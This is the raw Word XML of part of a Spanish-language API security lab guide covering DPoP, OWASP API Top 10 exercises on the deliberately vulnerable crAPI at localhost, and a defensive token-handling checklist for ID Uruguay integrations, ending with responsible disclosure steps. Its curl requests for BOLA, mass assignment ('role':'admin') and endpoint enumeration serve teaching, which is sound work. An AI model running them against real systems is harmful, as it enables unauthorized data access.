          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print(signing_input.decode() + "." + sig)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python dpop_proof.py</w:t>
      </w:r>
    </w:p>
    <w:p/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la prueba ata el token al método (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>htm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>), a la URL (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>htu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) y a un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> único. El servidor debe validar los tres y rechazar repeticiones. Un bearer robado </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no sirve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sin esta clave. Comparar: es el mismo espíritu de OAuth 1.0, pero sin canonicalización y sobre JSON.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Demostración de valor: repetí el token bearer del Paso 4 desde otro cliente (funciona). Con DPoP, el mismo token sin la prueba del cliente </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> funciona.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte E — OWASP API Top 10 con crAPI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 20 — Levantar crAPI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git clone https://github.com/OWASP/crAPI.git</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cd crAPI/deploy/docker</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker compose --env-file .env up -d</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Si algún comando cambió, seguí el README del repositorio: https://github.com/OWASP/crAPI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>crAPI queda en http://localhost:8888.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 21 — Registrar usuario y obtener token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 1) Registro (adaptá el host/puerto al de tu despliegue)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8888/identity/api/auth/signup \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"name":"tester","email":"tester@lab.local","number":"5551234567","password":"Test1234!"}'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 2) Login (devuelve un token)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8888/identity/api/auth/login \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"email":"tester@lab.local","password":"Test1234!"}' | tee login.json | jq</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>TOKEN=$(jq -r .token login.json)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "$TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 22 — API1: BOLA (el más importante)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>En la interfaz de crAPI, creá un pedido/video y anotá su ID.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Con Burp/Postman (o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">), pedí </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>otro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID del mismo tipo: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curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/workshop/api/shop/orders/&lt;OTRO_ID&gt; | jq</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/workshop/api/shop/products | jq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si devuelve datos de otro usuario, hay </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>BOLA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token válido + autorización a nivel de objeto ausente. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Api1 OWASP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — la vulnerabilidad número uno.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 23 — API3: Mass assignment / BOPLA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curl -s -X POST http://localhost:8888/identity/api/auth/v3/check-otp \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" -d '{"email":"tester@lab.local","otp":"0000"}'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Probá enviar campos de rol/saldo en endpoints de actualización (en el lab):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X PUT http://localhost:8888/identity/api/v2/user/personal \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"name":"x","role":"admin","balance":999999}'</w:t>
      </w:r>
    </w:p>
    <w:p/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si el backend acepta campos que no debería, el cliente controla propiedades sensibles.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 24 — API4/API9: consumo y versiones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 Rate limit / consumo: repetí una búsqueda costosa N veces</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer $TOKEN" "http://localhost:8888/workshop/api/shop/products"; done; echo</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Inventario: buscar versiones/swaggers expuestos</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>for p in /swagger /v1 /v2 /api /openapi.json /docs; do echo -n "$p -&gt; "; curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8888$p; done</w:t>
      </w:r>
    </w:p>
    <w:p/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ausencia de límites (Api4) e inventario desactualizado expuesto (Api9).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Mapeo completo de los 10 riesgos y cómo probarlos: ver Módulo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>clase_tokens_seguridad.md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Parte F — ID Uruguay (defensivo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Línea estricta:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sólo tu cuenta y tu cliente de desarrollo. No se prueba el IdP ni clientes de terceros. Para evaluar el IdP, coordiná con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>AGESIC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CERTuy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Paso 25 — Recabar la evidencia documental</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Abrí y leé:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/sites/agencia-gobierno-electronico-sociedad-informacion-conocimiento/files/Desarrollo%20seguro.pdf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Buscá: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token_type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Bearer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id_token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JWT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code_challenge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redirect_uri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el Estado uruguayo emite tokens bearer vía OIDC; el ID token es un JWT. Es evidencia </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sin tocar nada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Paso 26 — Observar tu propio flujo (con tu cuenta)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Iniciá sesión en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> aplicación integrada (o tu cliente de pruebas registrado).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">DevTools → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Network</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → filtrá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>token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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>authorization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Localizá la respuesta del </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>token endpoint</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y la petición con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Bearer ...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Enmascará el token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en pantalla (mostrá el inicio y tapá el resto).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el token es legible y extraíble del navegador; "quien lo tiene, lo usa". Sin ningún acceso indebido.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 27 — Decodificar tu ID token (offline)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Copiá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID token y pegalo en https://jwt.io (decodifica en el navegador, no viaja a ningún servidor).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado: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iss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sub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exp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auth_time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amr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acr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> según configuración.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qué dice tu token y qué claims debería validar tu app.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 28 — Checklist de verificación de TU integración</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Completá esta tabla mirando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> código/configuración (no el IdP):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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Control</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo verificarlo en tu cliente</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Esperado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PKCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264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code_challenge</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0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method=S256</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> en tu authorization request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Presente</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264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redirect_uri</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> exacta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URI registrada sin comodines; tu app la valida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Coincidencia exacta</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264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state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Generado aleatorio y validado al volver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Presente y de un solo uso</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264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nonce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Enviado en el request OIDC y validado en el ID token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Presente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Validación del ID token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 xml:space="preserve">Tu código valida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iss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aud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exp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nonce</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, firma (JWKS)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Todo validado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No usar ID token para APIs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Buscá en tu código si el ID token viaja a la API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Nunca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Vida del access token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 xml:space="preserve">Decodificá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exp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> de tu access token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Corta (minutos/horas)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Rotación de refresh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Repetí refresh: ¿cambia? ¿el viejo se invalida?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Rotación + detección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Revocación/logout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Cerrá sesión y reintentá con el token viejo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Rechazado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Transporte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Sólo HTTPS; token en header (no en query/URL)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Cumplido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Almacenamiento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 xml:space="preserve">Memoria o cookie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HttpOnly</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">; no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localStorage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Sin acceso por JS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Paso 29 — Reproducción de la demostración para clase</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Seguí el guion del </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Módulo M11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: documentación → DevTools con token enmascarado → decode en jwt.io → cierre de sesión → frase de cierre.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todo el argumento de la charla con un caso uruguayo real, sin invadir nada.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 30 — Si encontrás algo: reporte responsable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Usá la plantilla del archivo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>clase_tokens_seguridad.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Sección 5) y canalizá por:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CERTuy (AGESIC):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Contacto del equipo dueño del sistema.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Incluí alcance probado, pasos mínimos y evidencia enmascarada. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> accedas a datos de terceros para "probar impacto".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Limpieza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docker stop keycloak juice 2&gt;/dev/null; docker rm keycloak juice 2&gt;/dev/null</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># crAPI</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cd crAPI/deploy/docker &amp;&amp; docker compose down -v</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># procesos locales</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>#   Ctrl+C en las terminales de lab_jwt.py y lab_rs.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Resumen: paso → qué demuestra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i w:val="0"/>
              </w:rPr>
